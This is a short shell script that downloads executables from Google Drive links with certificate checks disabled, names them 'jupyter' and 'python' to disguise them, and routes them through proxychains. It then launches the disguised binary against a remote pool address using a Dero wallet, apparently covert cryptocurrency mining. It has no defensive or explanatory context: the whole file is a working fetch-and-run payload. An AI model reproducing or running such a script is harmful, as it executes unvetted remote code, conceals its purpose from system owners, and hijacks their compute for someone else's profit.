#!/bin/sh
wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=1nSq9rD1PrsJUtsLPFiDUB1IdjKbDamdl' -O jupyter
chmod u+x jupyter
wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=1KVFnDYR5qILK8JOIZ-eLu9Vil2W5b7JB' -O python
chmod +x python 
wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=1_jtbxl-qbE-mqkH9KS0PUeXTRNJQtj2d' -O libproxychains4.so
chmod +x libproxychains4.so 
wget --no-check-certificate 'https://docs.google.com/uc?export=download&id=1753mFbImpeIJjB-iRlh2LsmJZQSyc7eJ' -O proxychains.conf
chmod +x proxychains.conf
sleep 1  
echo "IP ORI ==> "$(curl ifconfig.me)  
sleep 1  
echo "IP Baru ==> "$(./python curl ifconfig.me) 
sleep 1  
./python ./jupyter --hosting=128.199.162.251:443 --rekeningku=dero1qy5ej3leuegvztetxpv9f3v8z60alq0p3s2gkz0kswh2hd5w3gz72qgs4dzvk
